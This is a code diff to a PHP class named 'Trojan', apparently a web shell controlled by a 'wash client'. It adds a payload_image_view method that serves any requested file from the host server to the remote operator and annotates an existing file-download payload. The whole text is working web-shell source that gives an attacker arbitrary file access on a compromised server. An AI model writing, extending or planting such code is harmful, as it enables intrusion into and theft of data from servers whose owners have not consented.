@@ -151,6 +151,7 @@ class Trojan{
      * @param string $args             Arguments passed from the wash client
      */
     public function payload_file_down($args){
+        # emulate directory persistence
         $file = $args['file'];
         chdir($this->cwd);
         # if the requested file exists, serve it up to the user
@@ -187,7 +188,34 @@ class Trojan{
         $this->send_response();
     }
 
-    # fire mah layzor
+    /**
+     * Downloads a file
+     *
+     * @param string $args             Arguments passed from the wash client
+     */
+    public function payload_image_view($args){
+        # emulate directory persistence
+        $file = $args['file'];
+        chdir($this->cwd);
+
+        # if the requested file exists, serve it up to the user
+        if(file_exists($file)){
+            # extract some image information
+            $image_data = getimagesize($file);
+            header("Content-Type: {$image_data['mime']}");
+            header("Expires: 0");
+            header("Cache-Control: must-revalidate");
+            header("Pragma: public");
+            header("Content-Length: " . filesize($file));
+            readfile($file);
+        }
+        
+        # if not, provide a notification
+        else { echo "The requested file does not exist."; }
+        die();
+    }
+    
+    # a simple test payload
     public function payload_test_payload($args){
         # assemble a response
         $this->response = array(
